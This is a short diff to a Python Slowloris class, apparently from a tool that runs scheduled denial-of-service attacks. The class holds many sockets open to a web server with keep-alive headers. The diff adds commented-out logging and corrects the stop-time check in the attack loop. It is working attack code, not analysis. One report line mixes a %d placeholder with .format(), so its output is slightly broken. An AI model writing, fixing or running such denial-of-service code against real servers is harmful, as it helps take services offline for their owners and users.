@@ -198,6 +198,9 @@ class Slowloris:
 
         while True:
             #print(self.report)
+            # from app.components import logger
+            # logger.log("Sending request".format(), 'INFO')
+            # logger.log("Slowloris.report: {}".format(self.report), 'INFO')
             try:
                 self.report += "\r\nSending keep-alive headers... Socket count: {}".format(len(self.list_of_sockets))
                 for s in list(self.list_of_sockets):
@@ -221,7 +224,7 @@ class Slowloris:
 
                 # break attack by stop time
                 stop_time = datetime.strptime(self.to_stop_at, '%Y-%m-%d %H:%M:%S')
-                if datetime.now() <= stop_time:
+                if datetime.now() >= stop_time:
                     break
 
                 self.report += "\r\nSleeping for %d seconds".format(self.sleeptime)
